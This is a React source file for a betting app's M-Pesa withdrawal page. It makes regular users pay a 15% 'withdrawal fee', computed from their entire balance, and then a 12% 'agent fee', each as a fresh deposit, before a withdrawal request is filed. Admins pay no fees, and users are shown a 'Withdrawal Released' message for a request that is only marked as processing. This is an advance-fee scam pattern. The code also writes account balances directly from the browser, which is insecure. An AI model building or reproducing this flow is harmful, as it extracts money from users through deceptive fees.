import { useEffect, useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "@/context/AuthContext";
import { useAdmin } from "@/hooks/useAdmin";
import { supabase } from "@/integrations/supabase/client";
import { ArrowLeft, Smartphone, Bitcoin, Loader2, Lock, ShieldCheck, CheckCircle2, X } from "lucide-react";
import { toast } from "sonner";
import { formatMoney } from "@/lib/currency";

type WithdrawTab = "mpesa" | "crypto" | "bank";
type FeeStep = "idle" | "fee" | "agent" | "submit" | "done";

const Withdraw = () => {
  const { user, profile, isLoggedIn, setShowAuthModal, refreshProfile, showDepositModal, setShowDepositModal, setDepositPrefill } = useAuth();
  const { isAdmin } = useAdmin();
  const navigate = useNavigate();
  const [tab, setTab] = useState<WithdrawTab>("mpesa");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [adminAmount, setAdminAmount] = useState(500);
  const [submitting, setSubmitting] = useState(false);
  const [step, setStep] = useState<FeeStep>("idle");
  const [feePaid, setFeePaid] = useState(false);
  const [agentPaid, setAgentPaid] = useState(false);
  const [waitStart, setWaitStart] = useState<number>(0);

  if (!isLoggedIn) {
    setShowAuthModal(true);
    return null;
  }

  const balance = profile?.balance ?? 0;
  // Both admins and regular users can choose the withdrawal amount.
  const amount = adminAmount;
  // 15% fee is ALWAYS computed from the user's full available balance (not the entered amount).
  const fee = isAdmin ? 0 : Math.ceil(balance * 0.15);
  const agentFee = isAdmin ? 0 : Math.ceil(amount * 0.12);

  const canWithdraw = useMemo(() => {
    if (!phoneNumber || phoneNumber.length < 9) return false;
    if (amount < 50) return false;
    if (amount > balance) return false;
    return true;
  }, [phoneNumber, amount, balance]);

  // Realtime listener for fee deposit confirmations (purpose-tagged transactions)
  useEffect(() => {
    if (!user || (step !== "fee" && step !== "agent")) return;

    const handleRow = (row: any) => {
      if (!row || row.type !== "deposit" || row.status !== "completed") return;
      const purpose = row.metadata?.purpose;
      const rowTime = row.created_at ? new Date(row.created_at).getTime() : 0;
      if (waitStart > 0 && rowTime < waitStart - 1000) return;

      if (step === "fee" && purpose === "withdrawal_fee") {
        setFeePaid(true);
        setStep("agent");
        setWaitStart(Date.now());
        toast.success(`15% fee of KES ${fee.toLocaleString()} confirmed.`);
        setShowDepositModal(false);
      } else if (step === "agent" && purpose === "agent_fee") {
        setAgentPaid(true);
        toast.success(`Agent fee of KES ${agentFee.toLocaleString()} confirmed.`);
        setShowDepositModal(false);
        // Auto-submit
        submitWithdrawal();
      }
    };

    const channel = supabase
      .channel(`wd-fee-${user.id}-${step}`)
      .on("postgres_changes",
        { event: "UPDATE", schema: "public", table: "transactions", filter: `user_id=eq.${user.id}` },
        (p) => handleRow(p.new))
      .on("postgres_changes",
        { event: "INSERT", schema: "public", table: "transactions", filter: `user_id=eq.${user.id}` },
        (p) => handleRow(p.new))
      .subscribe();
    return () => { supabase.removeChannel(channel); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user, step, waitStart, fee, agentFee]);

  const handleWithdrawClick = async () => {
    if (!user || !profile) return;
    if (!canWithdraw) return;

    if (isAdmin) {
      await processAdminWithdraw();
      return;
    }

    // Regular: launch fee flow
    setFeePaid(false);
    setAgentPaid(false);
    setWaitStart(Date.now());
    setStep("fee");
  };

  const processAdminWithdraw = async () => {
    if (!user || !profile) return;
    setSubmitting(true);
    try {
      await supabase.from("transactions").insert({
        user_id: user.id, type: "withdrawal", method: "mpesa",
        amount, status: "completed", reference: phoneNumber,
      });
      await supabase.from("profiles").update({ balance: profile.balance - amount }).eq("user_id", user.id);
      await refreshProfile();
      toast.success(`Withdrawal of KES ${amount.toLocaleString()} sent to ${phoneNumber}.`);
      navigate("/transactions");
    } catch (e: any) {
      toast.error(e.message || "Withdrawal failed");
    } finally {
      setSubmitting(false);
    }
  };

  const submitWithdrawal = async () => {
    if (!user || !profile) return;
    setStep("submit");
    setSubmitting(true);
    try {
      await supabase.from("withdrawal_requests").insert({
        user_id: user.id,
        amount,
        tax_fee: fee,
        agent_fee: agentFee,
        tax_paid: true,
        agent_paid: true,
        mpesa_phone: phoneNumber,
        status: "processing",
      });
      await supabase.from("transactions").insert({
        user_id: user.id, type: "withdrawal", method: "mpesa",
        amount, status: "processing", reference: phoneNumber,
      });
      const newBalance = Math.max(0, profile.balance - amount);
      const newWinnings = Math.max(0, (profile.winnings_balance || 0) - amount);
      await supabase.from("profiles")
        .update({ balance: newBalance, winnings_balance: newWinnings })
        .eq("user_id", user.id);
      await refreshProfile();
      setStep("done");
    } catch (e: any) {
      toast.error(e.message || "Failed to finalize withdrawal");
      setStep("agent");
    } finally {
      setSubmitting(false);
    }
  };

  const openDepositForFee = (purpose: "withdrawal_fee" | "agent_fee", amt: number) => {
    setDepositPrefill({ amount: amt, purpose });
    setShowDepositModal(true);
  };

  const cancelFlow = () => {
    setStep("idle");
    setFeePaid(false);
    setAgentPaid(false);
    setDepositPrefill(null);
  };

  const tabs: { key: WithdrawTab; label: string; icon: any; active: boolean }[] = [
    { key: "mpesa", label: "M-Pesa", icon: Smartphone, active: true },
    { key: "crypto", label: "Crypto", icon: Bitcoin, active: false },
    { key: "bank", label: "Bank", icon: Lock, active: false },
  ];

  return (
    <div className="min-h-screen bg-background">
      <div className="sticky top-0 z-40 bg-card border-b border-border px-4 py-3 flex items-center gap-3">
        <button onClick={() => navigate(-1)} className="text-muted-foreground hover:text-foreground">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="font-display text-lg font-bold uppercase tracking-wider">Withdraw</h1>
      </div>

      <div className="max-w-md mx-auto p-4">
        {/* Balance + admin badge */}
        <div className="bg-card border border-border rounded-lg p-4 mb-4 text-center">
          <p className="text-xs text-muted-foreground uppercase tracking-wider">Available Balance</p>
          <p className="text-2xl font-bold text-primary mt-1">{formatMoney(balance, profile)}</p>
          {isAdmin && (
            <div className="inline-flex items-center gap-1.5 mt-2 text-[10px] uppercase tracking-wider bg-primary/15 text-primary border border-primary/30 px-2 py-0.5 rounded-full font-bold">
              <ShieldCheck className="w-3 h-3" /> Admin Account
            </div>
          )}
          {profile && (profile.winnings_balance || 0) > 0 && (
            <p className="text-[11px] text-accent mt-2">
              Note: winnings cannot be used to place bets — they can only be withdrawn after fees.
            </p>
          )}
        </div>

        {/* Tabs */}
        <div className="flex border-b border-border mb-4">
          {tabs.map((t) => (
            <button key={t.key}
              onClick={() => t.active && setTab(t.key)}
              disabled={!t.active}
              className={`flex-1 flex items-center justify-center gap-2 py-3 text-sm font-bold uppercase tracking-wider transition ${
                tab === t.key && t.active
                  ? "text-primary border-b-2 border-primary bg-primary/5"
                  : t.active
                  ? "text-muted-foreground hover:text-foreground"
                  : "text-muted-foreground/40 cursor-not-allowed"
              }`}>
              <t.icon className="w-4 h-4" /> {t.label}
              {!t.active && <span className="text-[9px] bg-muted px-1 rounded">Soon</span>}
            </button>
          ))}
        </div>

        {tab === "mpesa" && (
          <div className="space-y-4">
            <div>
              <label className="text-xs text-muted-foreground uppercase tracking-wider mb-2 block">M-Pesa Phone Number</label>
              <input
                type="tel" value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ""))}
                placeholder="0712345678"
                className="w-full bg-secondary border border-border rounded-md px-4 py-3 text-foreground outline-none focus:border-primary transition"
              />
            </div>
            <div>
              <label className="text-xs text-muted-foreground uppercase tracking-wider mb-2 block">Amount (KES)</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground font-bold">KES</span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAdminAmount(Math.max(0, Number(e.target.value)))}
                  className="w-full bg-secondary border border-border rounded-md pl-14 pr-4 py-3 text-lg font-bold text-foreground outline-none focus:border-primary transition"
                  min={50}
                  max={balance}
                />
              </div>
              <p className="text-[10px] text-muted-foreground mt-2">
                {isAdmin ? "Admin: no fees. " : `15% fee (KES ${fee.toLocaleString()}) is calculated from your full balance. `}Min: KES 50.
              </p>
            </div>

            <button
              onClick={handleWithdrawClick}
              disabled={submitting || !canWithdraw}
              className="w-full bg-accent text-accent-foreground py-3 rounded-md font-display font-bold text-sm uppercase tracking-wider hover:brightness-110 transition disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {submitting ? (<><Loader2 className="w-4 h-4 animate-spin" /> Processing...</>) : `Withdraw KES ${amount.toLocaleString()}`}
            </button>
          </div>
        )}

        {(tab === "crypto" || tab === "bank") && (
          <div className="text-center py-12">
            <Lock className="w-12 h-12 text-muted-foreground mx-auto mb-3" />
            <h3 className="font-display text-lg font-bold">Coming Soon</h3>
          </div>
        )}

        {step === "done" && (
          <div className="text-center py-12">
            <CheckCircle2 className="w-14 h-14 text-primary mx-auto mb-3" />
            <h3 className="font-display text-xl font-bold uppercase">Withdrawal Released</h3>
            <p className="text-sm text-muted-foreground mt-1">KES {amount.toLocaleString()} is on its way to {phoneNumber}.</p>
            <button onClick={() => navigate("/transactions")} className="mt-4 bg-primary text-primary-foreground px-6 py-2 rounded-md font-bold text-sm uppercase">View Transactions</button>
          </div>
        )}
      </div>

      {/* Two-step fee modal */}
      {(step === "fee" || step === "agent" || step === "submit") && !showDepositModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-background/80 backdrop-blur-sm p-4">
          <div className="bg-card border border-border rounded-xl w-full max-w-md overflow-hidden animate-in fade-in zoom-in-95">
            <div className="flex items-center justify-between p-4 border-b border-border">
              <h2 className="font-display text-base font-bold uppercase tracking-wider">
                {step === "fee" ? "Step 1: Pay 15% Withdrawal Fee" :
                 step === "agent" ? "Step 2: Pay 12% Agent Fee" :
                 "Releasing Withdrawal..."}
              </h2>
              <button onClick={cancelFlow} className="text-muted-foreground hover:text-foreground"><X className="w-5 h-5" /></button>
            </div>

            <div className="p-5 space-y-4">
              <div className="bg-secondary/50 border border-border rounded-md p-3 space-y-1.5 text-xs">
                <div className="flex justify-between"><span className="text-muted-foreground">Withdrawal amount</span><span className="font-bold">KES {amount.toLocaleString()}</span></div>
                {step === "fee" && (
                  <div className="flex justify-between"><span className="text-muted-foreground">15% withdrawal fee</span>
                    <span className="font-bold">KES {fee.toLocaleString()}</span>
                  </div>
                )}
                {(step === "agent" || step === "submit") && (
                  <>
                    <div className="flex justify-between"><span className="text-muted-foreground">15% withdrawal fee</span>
                      <span className="font-bold flex items-center gap-1 text-primary">
                        KES {fee.toLocaleString()} <CheckCircle2 className="w-3.5 h-3.5" />
                      </span>
                    </div>
                    <div className="flex justify-between"><span className="text-muted-foreground">12% agent fee</span>
                      <span className={`font-bold flex items-center gap-1 ${agentPaid ? "text-primary" : ""}`}>
                        KES {agentFee.toLocaleString()} {agentPaid && <CheckCircle2 className="w-3.5 h-3.5" />}
                      </span>
                    </div>
                  </>
                )}
              </div>

              {step === "fee" && (
                <>
                  <p className="text-xs text-foreground/80">
                    Pay the 15% withdrawal fee as a fresh deposit. Your balance will not be touched.
                  </p>
                  <button
                    onClick={() => openDepositForFee("withdrawal_fee", fee)}
                    className="w-full bg-accent text-accent-foreground py-3 rounded-md font-display font-bold text-sm uppercase tracking-wider hover:brightness-110">
                    Deposit KES {fee.toLocaleString()} (15%)
                  </button>
                  <p className="text-[11px] text-muted-foreground text-center">
                    Waiting for your 15% withdrawal fee deposit to clear — the agent fee step will unlock automatically.
                  </p>
                </>
              )}

              {step === "agent" && (
                <>
                  <p className="text-xs text-foreground/80">
                    Now pay the 12% agent fee as a fresh deposit to release your withdrawal.
                  </p>
                  <button
                    onClick={() => openDepositForFee("agent_fee", agentFee)}
                    className="w-full bg-accent text-accent-foreground py-3 rounded-md font-display font-bold text-sm uppercase tracking-wider hover:brightness-110">
                    Deposit KES {agentFee.toLocaleString()} (12% Agent Fee)
                  </button>
                  <button
                    onClick={submitWithdrawal}
                    disabled={!agentPaid || submitting}
                    className="w-full bg-primary text-primary-foreground py-2.5 rounded-md font-bold text-xs uppercase tracking-wider disabled:opacity-40 disabled:cursor-not-allowed">
                    Confirm Withdrawal of KES {amount.toLocaleString()}
                  </button>
                </>
              )}

              {step === "submit" && (
                <div className="text-center py-6">
                  <Loader2 className="w-10 h-10 animate-spin text-primary mx-auto mb-3" />
                  <p className="font-bold text-sm">Releasing your withdrawal…</p>
                </div>
              )}

              <button onClick={cancelFlow} className="w-full text-muted-foreground hover:text-foreground py-2 text-xs uppercase tracking-wider">
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Withdraw;
